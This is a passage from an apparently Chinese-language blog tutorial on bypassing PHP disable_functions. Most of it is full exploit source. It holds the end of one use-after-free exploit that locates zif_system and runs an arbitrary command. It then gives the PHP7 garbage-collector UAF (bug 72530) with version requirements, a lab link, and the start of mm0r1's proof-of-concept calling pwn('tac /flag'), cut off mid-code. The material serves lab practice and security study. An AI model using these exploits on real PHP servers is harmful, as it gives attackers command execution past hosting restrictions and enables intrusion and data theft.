class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$y</span>, <span class="variable">$cmd</span>, <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>, <span class="variable">$n_alloc</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$contiguous</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$contiguous</span>[] = <span class="keyword">new</span> DateInterval(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$room</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$room</span>[] = <span class="keyword">new</span> Z();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_protector</span> = <span class="keyword">$this</span>-&gt;ptr2str(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;abc = <span class="keyword">$this</span>-&gt;ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">new</span> DateInterval(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$y</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$protector</span> = <span class="string">&quot;.<span class="subst">$_protector</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$x</span> = <span class="keyword">new</span> DateInterval(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line">        <span class="variable">$x</span>-&gt;d = <span class="number">0x2000</span>;</span><br><span class="line">        <span class="variable">$x</span>-&gt;h = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc) != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;UAF failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span> = <span class="keyword">new</span> MySplFixedArray();</span><br><span class="line">        <span class="variable">$spl2</span> = <span class="keyword">new</span> MySplFixedArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        <span class="variable">$class_entry</span> = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        <span class="variable">$handlers</span> = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        <span class="variable">$php_heap</span> = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake class_entry</span></span><br><span class="line">        <span class="variable">$fake_obj</span> = <span class="variable">$abc_addr</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0</span>, <span class="number">2</span>); <span class="comment"># type</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x120</span>, <span class="variable">$abc_addr</span>); <span class="comment"># fake class_entry</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy some of class_entry definition</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak1(<span class="variable">$class_entry</span> + <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake static members table</span></span><br><span class="line">        <span class="variable">$fake_tbl_off</span> = <span class="number">0x70</span> * <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x30</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x38</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake zval_reference</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">8</span>, <span class="number">10</span>); <span class="comment"># zval type (reference)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># look for binary base</span></span><br><span class="line">        <span class="variable">$binary_leak</span> = <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$handlers</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="keyword">$this</span>-&gt;get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse elf header</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="keyword">$this</span>-&gt;parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get basic_functions address</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="keyword">$this</span>-&gt;get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># find system entry</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="keyword">$this</span>-&gt;get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># copy hashtable offsetGet bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_off</span> = <span class="number">0x70</span> * <span class="number">5</span> - <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$function_data</span> = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$function_data</span> + <span class="number">0x40</span> * <span class="number">4</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_addr</span> = <span class="variable">$abc_addr</span> + <span class="variable">$fake_bkt_off</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x50</span>, <span class="variable">$fake_bkt_addr</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">3</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x58</span> + <span class="variable">$i</span> * <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy bucket zval</span></span><br><span class="line">        <span class="variable">$function_zval</span> = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">12</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc,  <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak2(<span class="variable">$function_zval</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pwn</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="number">0x30</span>, <span class="variable">$zif_system</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>, <span class="variable">$fake_bkt_addr</span> + <span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span>-&gt;offsetGet(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$y</span> = [<span class="keyword">new</span> Z()];</span><br><span class="line">json_encode([&amp;<span class="variable">$y</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接访问即可执行命令。</p>
<h3 id="PHP7-GC-with-Certain-Destructors-UAF"><a href="#PHP7-GC-with-Certain-Destructors-UAF" class="headerlink" title="PHP7 GC  with Certain Destructors UAF"></a>PHP7 GC  with Certain Destructors UAF</h3><p><strong>漏洞简介</strong>：</p>
<p>此漏洞利用PHP垃圾收集器（garbage collector）中存在三年的一个 bug，通过PHP垃圾收集器中堆溢出来绕过disable_functions并执行系统命令。</p>
<p>漏洞细节：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=72530">https://bugs.php.net/bug.php?id=72530</a></p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Linux 操作系统</li>
<li>PHP 版本<ul>
<li>7.0 - all versions to date</li>
<li>7.1 - all versions to date</li>
<li>7.2 - all versions to date</li>
<li>7.3 - all versions to date</li>
</ul>
</li>
</ul>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7</a></p>
<p><strong>靶场突破</strong>：</p>
<p>除了蚁剑的扩展插件，还可以使用国外大佬<em>mm0r1</em>写的EXP：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;tac /flag&quot;</span>);			<span class="comment">// 可替换成需要执行的命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = chr(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span 